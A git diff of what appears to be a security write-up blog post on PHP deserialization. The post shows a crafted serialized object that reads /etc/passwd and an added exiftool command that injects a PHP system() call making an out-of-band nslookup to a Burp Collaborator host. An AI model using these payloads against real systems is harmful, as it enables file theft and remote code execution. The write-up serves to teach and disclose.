@@ -64,16 +64,16 @@ In the above code, a user controlled value can be passed on to a PHP un-serializ
 
 Serializing a 3 char string array
 
-![] (https://github.com/InfoSecAntara/theantaramane/tree/main/assets/img/sample_serializled_code.png)
+![] (https://github.com/InfoSecAntara/theantaramane/assets/sample_serializled_code.png)
 
 **Understanding the serialized string**
 
-![] (https://github.com/InfoSecAntara/theantaramane/tree/main/assets/img/understanding_serialzed.png)
+![] (https://github.com/InfoSecAntara/theantaramane/assets/understanding_serialzed.png)
 
 
 In our case, I found an instance where the "file" parameter was carrying a base64 encoded payload, later identified to be a serialized object as following;
 
-![] (https://github.com/InfoSecAntara/theantaramane/tree/main/assets/img/instance.png)
+![](https://github.com/InfoSecAntara/theantaramane/assets/instance.png)
 
 Deserialized form:
 
@@ -87,7 +87,7 @@ O:11:"IncludeFile":1:{s:8:"filename";s11:"/etc/passwd";}
 
 This is cool, let's base64 encode; and boomm!! it worked
 
-![] (https://github.com/InfoSecAntara/theantaramane/assets/img/etc_passwd.png)
+![](https://github.com/InfoSecAntara/theantaramane/assets/etc_passwd.png)
 
 Using the power of reflection we were able to modify the serialized objects and access any arbitrary files from the server!! Ins't this amazing?? 
 
@@ -99,9 +99,9 @@ So I had a file upload functionality, and this functionality only allows the ima
   2. Upoad the file and locate the path
   3. Utilize LFI include image file and make an Out of Band call to confirm the code execution
 
+We will be using exif tool with the following command:
 
-
-
+"exiftool -Comment='<?php system("nslookup 4lqd7k2ulofzkiwzv0m5gf7qohu8ix.burpcollaborator.net"); ?>' beingsecure.jpeg"
 
 
 
